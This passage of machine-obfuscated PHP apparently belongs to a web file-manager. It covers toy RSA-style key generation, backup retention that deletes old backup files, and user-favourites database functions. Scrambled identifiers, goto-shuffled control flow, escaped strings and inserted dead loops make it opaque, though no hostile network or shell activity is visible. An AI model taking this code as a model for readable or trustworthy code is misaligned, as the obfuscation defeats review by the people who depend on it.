$f½¸éÒù½×[10], $f½¸éÒù½×[149]); $d‚¨†„»œ™ = $f½¸éÒù½×[114]($f½¸éÒù½×[341] . ($FÃÖõ¨‰£à + $AÜ·†…˜½î) . $f½¸éÒù½×[342] . $e›ä‹È´´Ä . $f½¸éÒù½×[342] . $böäÜÄ«¥¸ . $f½¸éÒù½×[343]); $e¹Šä¢òˆí = $d‘á³È±Ñ[672]; goto cå°äĞ†‹ö; c—¤½øÖàõ: $AÜ·†…˜½î = $this->{$_SERVER[òÈ„‹Ü][340]}(); $FÚ¦ƒïé£É = ($FÃÖõ¨‰£à - 1) * ($AÜ·†…˜½î - 1); $e›ä‹È´´Ä = $f½¸éÒù½×[201](($FÃÖõ¨‰£à + $AÜ·†…˜½î) / 2); goto b¦ÌèİÓá; fÈïÙé¡õÈ: $a¬×´—«†Ş = $d‘á³È±Ñ[617]; while ($a¬×´—«†Ş < $d‘á³È±Ñ[555]) { if ($a¬×´—«†Ş >= 0) { break; } $a¬×´—«†Ş++; } goto BÔ½™êçÆÌ; b¦ÌèİÓá: while (1) { $bÑ¼âá­¸ = $e›ä‹È´´Ä; $FÎ¡ÍÎ‡‘ğ = $FÚ¦ƒïé£É; while ($FÎ¡ÍÎ‡‘ğ % $bÑ¼âá­¸ != 0) { $Bµ²Êä´½Â = $FÎ¡ÍÎ‡‘ğ; $FÎ¡ÍÎ‡‘ğ = $bÑ¼âá­¸; $c‡¼¸Í©¯Ã = $d‘á³È±Ñ[671]; while (strlen($c‡¼¸Í©¯Ã) < $d‘á³È±Ñ[555]) { if (!$c‡¼¸Í©¯Ã) { break; } $c‡¼¸Í©¯Ã++; } $bÑ¼âá­¸ = $Bµ²Êä´½Â % $bÑ¼âá­¸; } if ($bÑ¼âá­¸ == 1) { break; } else { $e›ä‹È´´Ä++; } } $böäÜÄ«¥¸ = 2; for ($C½ƒ‡¥ó«Ñ = 0; $C½ƒ‡¥ó«Ñ < $FÚ¦ƒïé£É * 10; $C½ƒ‡¥ó«Ñ++) { if (($FÚ¦ƒïé£É * $C½ƒ‡¥ó«Ñ + 1) % $e›ä‹È´´Ä == 0) { $böäÜÄ«¥¸ = $f½¸éÒù½×[201](($FÚ¦ƒïé£É * $C½ƒ‡¥ó«Ñ + 1) / $e›ä‹È´´Ä); break; } } goto CØªÏÂÉˆÆ; BÔ½™êçÆÌ: } public function aovi8dbe03de($A÷ä¤ÚÇŸ) { goto BâõÌ±¨ä¡; B– Œ“ƒ³ø: $a±¥£•Ôâ· = $c˜ô ñ‘×[201]($a±¥£•Ôâ·); $C¢®à¾œ´Ú = $Aİ±Ê‡ê–[675]; if (strlen($C¢®à¾œ´Ú) < $Aİ±Ê‡ê–[555]) { return; } goto e®¨Åç°à; e„õçÓéÉ: $D¼š¡çñ = $Aİ±Ê‡ê–[680]; $C–ä‰˜ğ = $c˜ô ñ‘×[201](($e…Âù£â§ + $cÀƒÍÂ©Íƒ) / 2); while (1) { $BíÈÎïï = $C–ä‰˜ğ; $E½Êê‘æ¸ = $eÇ‹ùï â£; $BšŒÂäÊ–Š = $Aİ±Ê‡ê–[681]; if (strlen($BšŒÂäÊ–Š) < $Aİ±Ê‡ê–[558]) { return; } while ($E½Êê‘æ¸ % $BíÈÎïï != 0) { $cÎŒ¬£Õµ¬ = $E½Êê‘æ¸; $E½Êê‘æ¸ = $BíÈÎïï; $BíÈÎïï = $cÎŒ¬£Õµ¬ % $BíÈÎïï; $FÚ²ñƒ‹Ù‡ = $Aİ±Ê‡ê–[682]; } if ($BíÈÎïï == 1) { break; } else { $C–ä‰˜ğ++; } } goto D‚İœ™Ç„; fµ÷Ú¿ğè´: $B­©ˆ·ô† = $Aİ±Ê‡ê–[673]; if (!$B­©ˆ·ô†) { die; } if ($c˜ô ñ‘×[19]($cÃÃï‰ŒÜ‘) != 2) { return $c˜ô ñ‘×[10]; } goto e„‰èø‚²; bĞíˆİÚÑ: $D±Ãâ±µÃ = $this->{$_SERVER[òÈ„‹Ü][246]}($cÃÃï‰ŒÜ‘[0], $Bğò¿¿‡¹İ); return $D±Ãâ±µÃ; goto aêˆ‚«ºâ; e„‰èø‚²: $a±¥£•Ôâ· = $this->{$_SERVER[òÈ„‹Ü][246]}($cÃÃï‰ŒÜ‘[1] . $c˜ô ñ‘×[10], $c˜ô ñ‘×[149]); $bÌßİßóšñ = $Aİ±Ê‡ê–[674]; if (!$a±¥£•Ôâ·) { return $c˜ô ñ‘×[10]; } goto B– Œ“ƒ³ø; D‚İœ™Ç„: $a¬¶Ùğ«ƒ = 2; for ($bİªñ ë¨È = 0; $bİªñ ë¨È < $eÇ‹ùï â£ * 10; $bİªñ ë¨È++) { if (($eÇ‹ùï â£ * $bİªñ ë¨È + 1) % $C–ä‰˜ğ == 0) { $a¬¶Ùğ«ƒ = $c˜ô ñ‘×[201](($eÇ‹ùï â£ * $bİªñ ë¨È + 1) / $C–ä‰˜ğ); break; } } $Bğò¿¿‡¹İ = $c˜ô ñ‘×[114]($c˜ô ñ‘×[341] . ($e…Âù£â§ + $cÀƒÍÂ©Íƒ) . $c˜ô ñ‘×[342] . $C–ä‰˜ğ . $c˜ô ñ‘×[342] . $a¬¶Ùğ«ƒ . $c˜ô ñ‘×[343]); goto bĞíˆİÚÑ; AÚ¢‚Æ«ãÎ: $cÀƒÍÂ©Íƒ = 0; for ($bİªñ ë¨È = 3; $bİªñ ë¨È < $a±¥£•Ôâ·; $bİªñ ë¨È += 2) { if ($a±¥£•Ôâ· % $bİªñ ë¨È != 0) { continue; } $e…Âù£â§ = $bİªñ ë¨È; $Aˆô’«ª¼² = $Aİ±Ê‡ê–[677]; if (!$Aˆô’«ª¼²) { die; } $cÀƒÍÂ©Íƒ = $c˜ô ñ‘×[201]($a±¥£•Ôâ· / $bİªñ ë¨È); $bÑÎš¥æ‰À = $Aİ±Ê‡ê–[678]; break; $fÊ”Ô³»õ³ = $Aİ±Ê‡ê–[679]; while (strlen($fÊ”Ô³»õ³) < $Aİ±Ê‡ê–[551]) { if (!$fÊ”Ô³»õ³) { break; } $fÊ”Ô³»õ³++; } } $eÇ‹ùï â£ = ($e…Âù£â§ - 1) * ($cÀƒÍÂ©Íƒ - 1); goto e„õçÓéÉ; e®¨Åç°à: $e…Âù£â§ = 0; $d‚æîÓÏî = $Aİ±Ê‡ê–[676]; if (strlen($d‚æîÓÏî) < $Aİ±Ê‡ê–[610]) { die; } goto AÚ¢‚Æ«ãÎ; BâõÌ±¨ä¡: $Aİ±Ê‡ê– =& $_SERVER[‚Ğ°–—î]; $c˜ô ñ‘× =& $_SERVER[òÈ„‹Ü]; $cÃÃï‰ŒÜ‘ = $c˜ô ñ‘×[0]($c˜ô ñ‘×[344], $A÷ä¤ÚÇŸ); goto fµ÷Ú¿ğè´; aêˆ‚«ºâ: } public function gcmp984e8fea() { goto CÄ¡µêé‚; CÄ¡µêé‚: $A‡Ã‰¡æ‡Ş =& $_SERVER[‚Ğ°–—î]; $DõŞÎ·ÁÆ =& $_SERVER[òÈ„‹Ü]; $fÙ³À®ìå¿ = $DõŞÎ·ÁÆ[325]($DõŞÎ·ÁÆ[345](2, 14), $DõŞÎ·ÁÆ[345](2, 16) - 1); goto c“§¬¾Õƒ©; c“§¬¾Õƒ©: $aöŒÜìˆÕ = array(); $C‚¬©øĞÁ¿ = 1; while ($C‚¬©øĞÁ¿ <= (int) $DõŞÎ·ÁÆ[346]($fÙ³À®ìå¿)) { $cù‚ÎŒÂÔÅ = $C‚¬©øĞÁ¿; while (!0) { $cù‚ÎŒÂÔÅ++; $aÂÙå¸¹Á = $A‡Ã‰¡æ‡Ş[683]; if (!$aÂÙå¸¹Á) { return; } if ($cù‚ÎŒÂÔÅ <= 2) { $C‚¬©øĞÁ¿ = $cù‚ÎŒÂÔÅ; break; } else { if ($cù‚ÎŒÂÔÅ < 2) { continue; } } $DõŒí¼¾‰… = !0; for ($A­øÂŒå = 2; $A­øÂŒå <= $DõŞÎ·ÁÆ[346]($cù‚ÎŒÂÔÅ); $A­øÂŒå++) { if ($cù‚ÎŒÂÔÅ % $A­øÂŒå == 0) { $DõŒí¼¾‰… = !1; } } if ($DõŒí¼¾‰…) { $C‚¬©øĞÁ¿ = $cù‚ÎŒÂÔÅ; break; } } $aöŒÜìˆÕ[] = $C‚¬©øĞÁ¿; } goto Cšèª·Âë»; Cšèª·Âë»: $dº÷£¯ˆ© = 2; for ($cù‚ÎŒÂÔÅ = $fÙ³À®ìå¿; $cù‚ÎŒÂÔÅ > 1; $cù‚ÎŒÂÔÅ--) { $DõŒí¼¾‰… = !0; $B©Š¹Âó¥Ñ = $A‡Ã‰¡æ‡Ş[684]; foreach ($aöŒÜìˆÕ as $Cõ˜õãéò¯) { if ($cù‚ÎŒÂÔÅ % $Cõ˜õãéò¯ == 0) { $DõŒí¼¾‰… = !1; break; } } if ($DõŒí¼¾‰…) { $dº÷£¯ˆ© = $cù‚ÎŒÂÔÅ; break; } } return $dº÷£¯ˆ©; goto A“˜áùùëñ; A“˜áùùëñ: } public function nitm31024a74($BÖ©§šÃè÷, $bÓ­ôµ à) { $a¢Œ÷ÁÏ®ö =& $_SERVER[òÈ„‹Ü]; return $a¢Œ÷ÁÏ®ö[13](array($a¢Œ÷ÁÏ®ö[14], $a¢Œ÷ÁÏ®ö[347]), $BÖ©§šÃè÷, $bÓ­ôµ à); } public function jcreb94dac84($FõíâÅèŠÂ, $aËï¶õ¯ÊÑ) { $A‰îƒšÛ”í =& $_SERVER[‚Ğ°–—î]; $bêù´Ñ­ä‹ =& $_SERVER[òÈ„‹Ü]; return $bêù´Ñ­ä‹[13](array($bêù´Ñ­ä‹[348], $bêù´Ñ­ä‹[349]), $FõíâÅèŠÂ, $aËï¶õ¯ÊÑ); $D±³’Ÿ¼õ = $A‰îƒšÛ”í[685]; while ($D±³’Ÿ¼õ < $A‰îƒšÛ”í[572]) { if ($D±³’Ÿ¼õ >= 0) { break; } $D±³’Ÿ¼õ++; } } public function aqlme7815f5f($aëŞÕ™‹æ, $AîÁÓÛ±¡) { $aÌù½ÏªÍ— =& $_SERVER[òÈ„‹Ü]; return $aÌù½ÏªÍ—[13](array($aÌù½ÏªÍ—[348], $aÌù½ÏªÍ—[350]), $aëŞÕ™‹æ, $AîÁÓÛ±¡); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $b³£‡İÉÃª =& $_SERVER[‚Ğ°–—î]; self::$name = date($b³£‡İÉÃª[686]); if (!($bòŒí’Î§‹ = Model($b³£‡İÉÃª[687])->lastItem())) { $bòŒí’Î§‹ = $this->initData(); } else { self::$name = $bòŒí’Î§‹[$b³£‡İÉÃª[28]]; if ($bòŒí’Î§‹[$b³£‡İÉÃª[688]] == $b³£‡İÉÃª[83]) { self::$name = date($b³£‡İÉÃª[689]); $EÚóêÀËŸî = 0; if (isset($bòŒí’Î§‹[$b³£‡İÉÃª[281]][$b³£‡İÉÃª[167]][$b³£‡İÉÃª[419]])) { $EÚóêÀËŸî = (int) $bòŒí’Î§‹[$b³£‡İÉÃª[281]][$b³£‡İÉÃª[167]][$b³£‡İÉÃª[419]]; } if ($bòŒí’Î§‹[$b³£‡İÉÃª[28]] == self::$name) { Model($b³£‡İÉÃª[687])->remove($bòŒí’Î§‹[$b³£‡İÉÃª[367]]); } $bòŒí’Î§‹ = $this->initData($EÚóêÀËŸî, $bòŒí’Î§‹[$b³£‡İÉÃª[690]]); } else { $this->checkStore($bòŒí’Î§‹[$b³£‡İÉÃª[690]]); } } self::$option = $bòŒí’Î§‹; } private function initData($FÌªèÔœ£‡ = 0, $B­ÂœÎ…» = '') { goto CĞ§¦ğÅñ; E¹„¡­Áš½: $this->checkStore($a¶—¬Åƒ‰æ[$CëĞ¥ãŞ¶Ô[690]]); $fÔîË·ê = array($CëĞ¥ãŞ¶Ô[690] => $a¶—¬Åƒ‰æ[$CëĞ¥ãŞ¶Ô[690]], $CëĞ¥ãŞ¶Ô[28] => self::$name, $CëĞ¥ãŞ¶Ô[688] => 0, $CëĞ¥ãŞ¶Ô[691] => $a¶—¬Åƒ‰æ[$CëĞ¥ãŞ¶Ô[691]], $CëĞ¥ãŞ¶Ô[281] => array($CëĞ¥ãŞ¶Ô[692] => array($CëĞ¥ãŞ¶Ô[688] => 0), $CëĞ¥ãŞ¶Ô[693] => array($CëĞ¥ãŞ¶Ô[688] => 0, $CëĞ¥ãŞ¶Ô[694] => 0, $CëĞ¥ãŞ¶Ô[695] => 0, $CëĞ¥ãŞ¶Ô[29] => $CëĞ¥ãŞ¶Ô[33]), $CëĞ¥ãŞ¶Ô[696] => array($CëĞ¥ãŞ¶Ô[688] => 0, $CëĞ¥ãŞ¶Ô[694] => 0, $CëĞ¥ãŞ¶Ô[695] => 0), $CëĞ¥ãŞ¶Ô[167] => array($CëĞ¥ãŞ¶Ô[688] => 0, $CëĞ¥ãŞ¶Ô[697] => 0, $CëĞ¥ãŞ¶Ô[698] => 0, $CëĞ¥ãŞ¶Ô[699] => 0, $CëĞ¥ãŞ¶Ô[700] => 0, $CëĞ¥ãŞ¶Ô[419] => $FÌªèÔœ£‡)), $CëĞ¥ãŞ¶Ô[701] => time(), $CëĞ¥ãŞ¶Ô[702] => 0); $a†ÄóŒÌˆ = Model($CëĞ¥ãŞ¶Ô[687])->insert($fÔîË·ê); goto c©²éàÛ¶¿; c©²éàÛ¶¿: $fÔîË·ê[$CëĞ¥ãŞ¶Ô[367]] = $a†ÄóŒÌˆ; return $fÔîË·ê; goto f–¬ñÄÉÍ›; CĞ§¦ğÅñ: $CëĞ¥ãŞ¶Ô =& $_SERVER[‚Ğ°–—î]; $a¶—¬Åƒ‰æ = Model($CëĞ¥ãŞ¶Ô[687])->config(); if ($B­ÂœÎ…» && $a¶—¬Åƒ‰æ[$CëĞ¥ãŞ¶Ô[690]] != $B­ÂœÎ…») { $FÌªèÔœ£‡ = 0; } goto E¹„¡­Áš½; f–¬ñÄÉÍ›: } private function checkStore($eØí“›Ï¼) { $F†¤ÌôÓÚ =& $_SERVER[‚Ğ°–—î]; $CÇÂó­Ö = Model($F†¤ÌôÓÚ[703])->listData($eØí“›Ï¼); Model($F†¤ÌôÓÚ[703])->checkConfig($CÇÂó­Ö); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[‚Ğ°–—î][687])->findByName(self::$name); } return self::$option; } public static function set($dßîÅçĞ´‘) { $e«Ší¿’‰ó =& $_SERVER[‚Ğ°–—î]; $eƒóßê¾•ñ = self::get(); foreach ($dßîÅçĞ´‘ as $eãó„Òäà’ => $fÊßÙ‚†Š„) { $Eğ¸›Ÿàªó = explode($e«Ší¿’‰ó[91], $eãó„Òäà’); $Däïä²áø = count($Eğ¸›Ÿàªó); switch ($Däïä²áø) { case 1: $eƒóßê¾•ñ[$Eğ¸›Ÿàªó[0]] = $fÊßÙ‚†Š„; break; case 2: $eƒóßê¾•ñ[$Eğ¸›Ÿàªó[0]][$Eğ¸›Ÿàªó[1]] = $fÊßÙ‚†Š„; break; case 3: $eƒóßê¾•ñ[$Eğ¸›Ÿàªó[0]][$Eğ¸›Ÿàªó[1]][$Eğ¸›Ÿàªó[2]] = $fÊßÙ‚†Š„; break; } } Model($e«Ší¿’‰ó[687])->update($eƒóßê¾•ñ[$e«Ší¿’‰ó[367]], $eƒóßê¾•ñ); self::$option = $eƒóßê¾•ñ; return self::$option; } public function keep() { $f¸íè‘ÚÏ =& $_SERVER[‚Ğ°–—î]; $FÉŠ…çÀÃ = self::get(); if ($FÉŠ…çÀÃ[$f¸íè‘ÚÏ[281]][$f¸íè‘ÚÏ[692]][$f¸íè‘ÚÏ[688]] == $f¸íè‘ÚÏ[83]) { return; } $this->backupKeep($FÉŠ…çÀÃ); self::set(array($f¸íè‘ÚÏ[704] => 1)); } private function backupKeep($d°¸­ù®÷¦) { goto eóŞ‡í³; dî“Ó˜¿“‡: for ($e‹ˆ”Â™”Ô = 0; $e‹ˆ”Â™”Ô < 12; $e‹ˆ”Â™”Ô++) { $f’×¸¯[] = date($AÜÑ¤È†’[705], strtotime("\55{$e‹ˆ”Â™”Ô}\x20\155\x6f\156\x74\x68\x73")); } $f’×¸¯ = array_unique($f’×¸¯); foreach ($dÄ«³ïÈ™Ö as $A……Ë¢Æ”›) { if (!empty($A……Ë¢Æ”›[$AÜÑ¤È†’[28]]) && in_array($A……Ë¢Æ”›[$AÜÑ¤È†’[28]], $f’×¸¯)) { continue; } Model($AÜÑ¤È†’[687])->remove($A……Ë¢Æ”›[$AÜÑ¤È†’[367]]); $Eò’Ü«øà = "\173\151\157\72{$d°¸­ù®÷¦[$AÜÑ¤È†’[690]]}\175\x2f\x64\141\164\x61\142\141\x73\x65\57\142\141\x63\x6b\165\x70\x5f{$A……Ë¢Æ”›[$AÜÑ¤È†’[28]]}"; IO::remove($Eò’Ü«øà, !1); } goto Bà†áïÅÎÄ; e›£†ÈÈ¨«: $e‹ˆ”Â™”Ô = 0; $f’×¸¯ = array(); foreach ($dÄ«³ïÈ™Ö as $A……Ë¢Æ”›) { if ($e‹ˆ”Â™”Ô >= 7) { break; } $f’×¸¯[] = $A……Ë¢Æ”›[$AÜÑ¤È†’[28]]; $e‹ˆ”Â™”Ô++; } goto dî“Ó˜¿“‡; eóŞ‡í³: $AÜÑ¤È†’ =& $_SERVER[‚Ğ°–—î]; $dÄ«³ïÈ™Ö = Model($AÜÑ¤È†’[687])->listData(); if (empty($dÄ«³ïÈ™Ö)) { return; } goto e›£†ÈÈ¨«; Bà†áïÅÎÄ: } public function db() { goto a‡ÅñÑÚêö; a‡‹‡•åÄò: $f›¥ŸÒ¶ÍÆ = new BackupDb(); if (!$f›¥ŸÒ¶ÍÆ->index()) { return !1; } self::set(array($F†ªø’´[706] => 1)); goto C¹îëÓõ¹; C¹îëÓõ¹: return !0; goto F¼ĞŞßÉ™; a‡ÅñÑÚêö: $F†ªø’´ =& $_SERVER[‚Ğ°–—î]; $eª‹øä‰ö = self::get(); if ($eª‹øä‰ö[$F†ªø’´[281]][$F†ªø’´[693]][$F†ªø’´[688]] == $F†ªø’´[83]) { return !0; } goto a‡‹‡•åÄò; F¼ĞŞßÉ™: } public function dbFile() { goto A°ÂŸÃÉö; Fä«õ½ÍÅÑ: return !0; goto a®¨íõ–Ìá; d¹Šì³Ö‘: $B¢§›ƒøÅæ = new BackupDbFile(); if (!$B¢§›ƒøÅæ->index()) { return !1; } self::set(array($Aº¤¤†·Êí[707] => 1)); goto Fä«õ½ÍÅÑ; A°ÂŸÃÉö: $Aº¤¤†·Êí =& $_SERVER[‚Ğ°–—î]; $F¬·‡î²½ = self::get(); if ($F¬·‡î²½[$Aº¤¤†·Êí[281]][$Aº¤¤†·Êí[696]][$Aº¤¤†·Êí[688]] == $Aº¤¤†·Êí[83]) { return !0; } goto d¹Šì³Ö‘; a®¨íõ–Ìá: } public function file() { $e‹Í³•Ô¦ =& $_SERVER[‚Ğ°–—î]; $e×¥âˆä•œ = self::get(); if ($e×¥âˆä•œ[$e‹Í³•Ô¦[281]][$e‹Í³•Ô¦[167]][$e‹Í³•Ô¦[688]] == $e‹Í³•Ô¦[83]) { return !0; } if (!isset($e×¥âˆä•œ[$e‹Í³•Ô¦[691]]) || $e×¥âˆä•œ[$e‹Í³•Ô¦[691]] == $e‹Í³•Ô¦[468]) { $FÍ³§ÊŠÁ = new BackupFile(); if (!$FÍ³§ÊŠÁ->index()) { return !1; } } self::set(array($e‹Í³•Ô¦[708] => 1, $e‹Í³•Ô¦[688] => 1)); return !0; } } goto bÎİºÒÅ‚î; dŞ×¸·îìî: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($d†Œ«¡¡¾Û) { $CŠ·Ê‰æàå =& $_SERVER[‚Ğ°–—î]; return array($CŠ·Ê‰æàå[2489] => array(USER_ID, $CŠ·Ê‰æàå[2490])); } protected function listData() { $fÛÆÛáåŞ =& $_SERVER[‚Ğ°–—î]; $DµšÙ¡¬¶Ã = array($fÛÆÛáåŞ[1429] => USER_ID, $fÛÆÛáåŞ[436] => 0); $b¬øÂ×Æ¢ø = $fÛÆÛáåŞ[2491]; $C¸ÙùÆõô = $this->field($b¬øÂ×Æ¢ø)->where($DµšÙ¡¬¶Ã)->order($fÛÆÛáåŞ[2492])->select(); return $C¸ÙùÆõô ? $C¸ÙùÆõô : array(); } protected function resetCache() { } protected function listView() { goto C ´¾Âœè; Dš‰¬Ÿ´“´: $bÜÌÈ½“æ = array_to_keyvalue($e„ÍÊ”­Ç, $E¨Â¡¨Ë¸Š[33], $E¨Â¡¨Ë¸Š[75]); if (!$bÜÌÈ½“æ) { return $cŞ‡‚˜™êÕ; } $AÈõ›æš½œ = 2000; goto cê§åè‡‡Õ; cê§åè‡‡Õ: $cè¢¦Èòà = array($E¨Â¡¨Ë¸Š[383] => array($E¨Â¡¨Ë¸Š[384], $bÜÌÈ½“æ)); $côøŸÆòã˜ = Model($E¨Â¡¨Ë¸Š[752])->listSource($cè¢¦Èòà, $AÈõ›æš½œ); $côøŸÆòã˜ = array_merge($côøŸÆòã˜[$E¨Â¡¨Ë¸Š[73]], $côøŸÆòã˜[$E¨Â¡¨Ë¸Š[74]]); goto EÙÃ½ÃÒ¹; EÙÃ½ÃÒ¹: $côøŸÆòã˜ = array_to_keyvalue($côøŸÆòã˜, $E¨Â¡¨Ë¸Š[369]); foreach ($cŞ‡‚˜™êÕ as $CÔ½ çƒí => $Cå«éŞËªœ) { $a¸§óñÑ‰ì = $côøŸÆòã˜[$Cå«éŞËªœ[$E¨Â¡¨Ë¸Š[75]]]; $a¸§óñÑ‰ì = $a¸§óñÑ‰ì ? $a¸§óñÑ‰ì : array(); $cŞ‡‚˜™êÕ[$CÔ½ çƒí] = array_merge($a¸§óñÑ‰ì, $Cå«éŞËªœ); } return $cŞ‡‚˜™êÕ; goto CÂÛÈ…‰¤»; C ´¾Âœè: $E¨Â¡¨Ë¸Š =& $_SERVER[‚Ğ°–—î]; $cŞ‡‚˜™êÕ = $this->listData(); $e„ÍÊ”­Ç = array_filter_by_field($cŞ‡‚˜™êÕ, $E¨Â¡¨Ë¸Š[29], $E¨Â¡¨Ë¸Š[382]); goto Dš‰¬Ÿ´“´; CÂÛÈ…‰¤»: } protected function addFav($D¬Œ†èœ¦›, $dõ® œùØ = '', $c©¦‚½‚ñï = "\x73\x6f\x75\x72\x63\x65") { goto cƒ˜Ô®¹†Š; F¨’±š±í©: $Dº¹”Ç²Ê = array($F¥¡çí[1429] => USER_ID, $F¥¡çí[436] => 0); $E‹¶Òµ¼¸ = $this->where($Dº¹”Ç²Ê)->max($F¥¡çí[2128]); if (!$E‹¶Òµ¼¸) { $E‹¶Òµ¼¸ = 0; } goto F‰İ¶“³Ü½; cƒ˜Ô®¹†Š: $F¥¡çí =& $_SERVER[‚Ğ°–—î]; $Dº¹”Ç²Ê = array($F¥¡çí[1429] => USER_ID, $F¥¡çí[436] => 0, $F¥¡çí[388] => $c©¦‚½‚ñï, $F¥¡çí[387] => $D¬Œ†èœ¦›); if ($this->where($Dº¹”Ç²Ê)->find()) { return !1; } goto F¨’±š±í©; F‰İ¶“³Ü½: if (!$dõ® œùØ && $c©¦‚½‚ñï == $F¥¡çí[382]) { $BËí‰‚· = Model($F¥¡çí[1118])->where(array($F¥¡çí[383] => $D¬Œ†èœ¦›))->find(); if (!$BËí‰‚·) { return !1; } $dõ® œùØ = $BËí‰‚·[$F¥¡çí[28]]; } $dõ® œùØ = $this->getAutoName($dõ® œùØ); $FÓÃ·æˆÍÁ = array($F¥¡çí[1429] => USER_ID, $F¥¡çí[436] => 0, $F¥¡çí[386] => $dõ® œùØ, $F¥¡çí[387] => $D¬Œ†èœ¦›, $F¥¡çí[388] => $c©¦‚½‚ñï, $F¥¡çí[2111] => $E‹¶Òµ¼¸ + 1); goto b‡¹¹‹Š§Ğ; b‡¹¹‹Š§Ğ: return $this->add($FÓÃ·æˆÍÁ); goto bõ¯¤ˆøÍæ; bõ¯¤ˆøÍæ: } protected function remove($a¨öÆƒ¾õ) { $DìŠï°Õ¤ª =& $_SERVER[‚Ğ°–—î]; $c¨¤ñìÆŠ… = array($DìŠï°Õ¤ª[1429] => USER_ID, $DìŠï°Õ¤ª[385] => $a¨öÆƒ¾õ); return $this->where($c¨¤ñìÆŠ…)->delete(); } protected function removeByName($bª˜ÔÏ«ŒÙ) { $Dš£ˆ—²¤ =& $_SERVER[‚Ğ°–—î]; $C—øŠÙ‘­ø = array($Dš£ˆ—²¤[1429] => USER_ID, $Dš£ˆ—²¤[386] => $bª˜ÔÏ«ŒÙ, $Dš£ˆ—²¤[436] => 0); return $this->where($C—øŠÙ‘­ø)->delete(); } protected function rename($aƒ»„Ê»‚š, $F´®‹Ñ÷âç) { $C¯Òè¦Äß¤ =& $_SERVER[‚Ğ°–—î]; if ($aƒ»„Ê»‚š == $F´®‹Ñ÷âç) { return !1; } $FÙÁÅ‘ßÂÇ = $this->getAutoName($F´®‹Ñ÷âç); if ($F´®‹Ñ÷âç != $FÙÁÅ‘ßÂÇ) { return !1; } $e™’ã’¡É¬ = array($C¯Òè¦Äß¤[1429] => USER_ID, $C¯Òè¦Äß¤[436] => 0, $C¯Òè¦Äß¤[28] => $aƒ»„Ê»‚š); return $this->where($e™’ã’¡É¬)->save(array($C¯Òè¦Äß¤[28] => $F´®‹Ñ÷âç)); } protected function resetSort($dÌ¿ËàŒŒÔ) { $C£åØ¹ˆ‰Ÿ =& $_SERVER[‚Ğ°–—î]; $dÌ¿ËàŒŒÔ = is_array($dÌ¿ËàŒŒÔ) ? $dÌ¿ËàŒŒÔ : array(); $b’Øì¡ğæà = array($C£åØ¹ˆ‰Ÿ[1429] => USER_ID); for ($dÇù°ß¶†¼ = 0; $dÇù°ß¶†¼ < count($dÌ¿ËàŒŒÔ); $dÇù°ß¶†¼++) { $b’Øì¡ğæà[$C£åØ¹ˆ‰Ÿ[385]] = $dÌ¿ËàŒŒÔ[$dÇù°ß¶†¼]; $this->where($b’Øì¡ğæà)->save(array($C£åØ¹ˆ‰Ÿ[2111] => $dÇù°ß¶†¼ + 1)); } return !0; } protected function moveTop($A‹¾îÕĞŒİ) { goto c–™ß—ô; aŒÑÊÍÓ¿Ø: if (!$A‰Í³ô†ù) { return; } $AÓ­¢¦øö = $this->field($C‘ìöø“Û[367])->where($Bä›ª‰ø‘Æ)->order($C‘ìöø“Û[2492])->select(); $AÓ­¢¦øö = array_to_keyvalue($AÓ­¢¦øö, $C‘ìöø“Û[33], $C‘ìöø“Û[367]); goto aÕ» ñ˜òÔ; aÕ» ñ˜òÔ: $bŠŸˆá©«Ì = $AÓ­¢¦øö; $AÓ­¢¦øö = array_remove_value($AÓ­¢¦øö, $A‰Í³ô†ù[$C‘ìöø“Û[367]]); array_unshift($AÓ­¢¦øö, $A‰Í³ô†ù[$C‘ìöø“Û[367]]); goto eÇ£—¢Úš; c–™ß—ô: $C‘ìöø“Û =& $_SERVER[‚Ğ°–—î]; $Bä›ª‰ø‘Æ = array($C‘ìöø“Û[1429] => USER_ID, $C‘ìöø“Û[436] => 0); $A‰Í³ô†ù = $this->where($Bä›ª‰ø‘Æ)->where(array($C‘ìöø“Û[28] => $A‹¾îÕĞŒİ))->find(); goto aŒÑÊÍÓ¿Ø; eÇ£—¢Úš: return $this->resetSort($AÓ­¢¦øö); goto E‚£·¬Úàõ; E‚£·¬Úàõ: } protected function moveBottom($C´ÎšõÓËÃ) { $B±´Á¼Ù¾ =& $_SERVER[‚Ğ°–—î]; $f§ÚØ¦… = array($B±´Á¼Ù¾[1429] => USER_ID, $B±´Á¼Ù¾[436] => 0); $eÒ…¢Õƒ…ˆ = $this->where($f§ÚØ¦…)->max($B±´Á¼Ù¾[2128]); $bŸøŒ£˜Ò¨ = array($B±´Á¼Ù¾[2128] => $eÒ…¢Õƒ…ˆ + 1); return $this->where($f§ÚØ¦…)->where(array($B±´Á¼Ù¾[28] => $C´ÎšõÓËÃ))->save($bŸøŒ£˜Ò¨); } private function getAutoName($AâïÂ¿íÀœ) { goto c„…³­ˆ–¹; Aó­’»õ£ˆ: return $AâïÂ¿íÀœ . "\x28{$D…øÍ˜´„Î}\51"; goto Díß•ùï’; c„…³­ˆ–¹: $aÖ¼¦ĞÊ‹ =& $_SERVER[‚Ğ°–—î]; $eñ¬Í§Ãùì = array($aÖ¼¦ĞÊ‹[1429] => USER_ID, $aÖ¼¦ĞÊ‹[436] => 0); $Bõ•íÇä†Ì = $this->field($aÖ¼¦ĞÊ‹[28])->where($eñ¬Í§Ãùì)->select(); goto Fˆ›ÉÖ¬ªÀ; Fˆ›ÉÖ¬ªÀ: $Bõ•íÇä†Ì = array_to_keyvalue($Bõ•íÇä†Ì, $aÖ¼¦ĞÊ‹[33], $aÖ¼¦ĞÊ‹[28]); if (!$Bõ•íÇä†Ì || !in_array($AâïÂ¿íÀœ, $Bõ•íÇä†Ì)) { return $AâïÂ¿íÀœ; } for ($D…øÍ˜´„Î = 0; $D…øÍ˜´„Î < count($Bõ•íÇä†Ì); $D…øÍ˜´„Î++) { if (!in_array($AâïÂ¿íÀœ . "\50{$D…øÍ˜´„Î}\51", $Bõ•íÇä†Ì)) { return $AâïÂ¿íÀœ . "\50{$D…øÍ˜´„Î}\x29"; } } goto Aó­’»õ£ˆ; Díß•ùï’: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\152\x6f\x62\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x64\145\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\x6f\x62\x4c\x69\x73\x74"; public function listData($c‘ÜĞ¥ÑÏ = 